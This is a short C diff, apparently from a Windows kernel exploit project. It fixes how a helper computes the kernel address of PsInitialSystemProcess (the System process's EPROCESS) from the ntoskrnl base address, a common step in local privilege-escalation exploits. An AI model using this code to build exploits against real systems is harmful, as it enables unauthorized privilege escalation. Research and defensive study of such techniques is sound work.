@@ -64,9 +64,8 @@ LPVOID EPROCESS_address(LPVOID ntoskernlBase) {
         fprintf(stderr, "GetProcAddress failed.\n");
         return NULL;
     }
-    LPVOID raw_hNtoskrl = (LPVOID)hNtoskrl;
-    LPVOID EPROCESS_adress = &PsInitialSystemProcess - &raw_hNtoskrl + &ntoskernlBase;
-    return EPROCESS_adress;
+    __int64 EPROCESS_address = (__int64)PsInitialSystemProcess - (__int64)hNtoskrl + (__int64)ntoskernlBase;
+    return (LPVOID)EPROCESS_address;
 }
 
 LPVOID ntoskernl_base(void) {
